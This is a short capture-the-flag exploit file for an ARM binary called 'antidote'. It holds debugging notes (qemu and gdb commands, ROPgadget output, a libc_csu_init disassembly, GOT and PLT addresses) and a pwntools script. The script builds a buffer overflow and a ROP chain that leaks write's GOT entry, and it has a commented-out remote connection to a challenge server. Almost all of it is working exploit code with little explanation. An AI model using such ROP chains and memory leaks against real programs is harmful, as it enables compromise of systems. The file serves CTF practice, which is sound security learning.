'''
apt install qemu
apt install qemu-user-static kpartx
apt install gdb-multiarch
apt install gcc-arm-linux-gnueabihf binutils-arm-linux-gnueabihf binutils-arm-linux-gnueabihf-dbg gdb-multiarch qemu-user

qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./antidote
gdb-multiarch -q --nh -ex 'set architecture arm' -ex 'file antidote' -ex 'target remote localhost:1234' -ex 'layout split' -ex 'layout regs'

qemu-arm -L /usr/arm-linux-gnueabihf ./antidote < input.txt

ROPgadget --binary ./antidote --only "pop"

0x000083cc : pop {r3, pc}

(gdb) disassemble __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   
   0x000085f4 <+136>:   mov     r0, r10
   0x000085f8 <+140>:   mov     r1, r8
   0x000085fc <+144>:   mov     r2, r7
   0x00008600 <+148>:   blx     r3
   
   0x00008628 <+188>:   pop     {r4, r5, r6, r7, r8, r9, r10, pc}

>>> elf.sym['write']
33824
>>> elf.got['write']
67664

'''
from pwn import *

context(arch='arm', bits=32, endian='little')
context.log_level = "debug"
'''
ip, port = '159.65.54.124', 30132
io = remote(ip, port)
'''
payload = 'A'*220
#write.plt(1, write.got, 4)
payload += p32(0x00008628) + p32(0)*3 + p32(4) + p32(67664) + p32(0) + p32(1) + p32(0x000083cc) + p32(33824) + p32(0x000085f4)

with open('input.txt','wb') as f:
	f.write(payload)
'''
io.recvuntil('Careful there! That hurt!')
io.sendline(payload)
print io.recvall()
'''
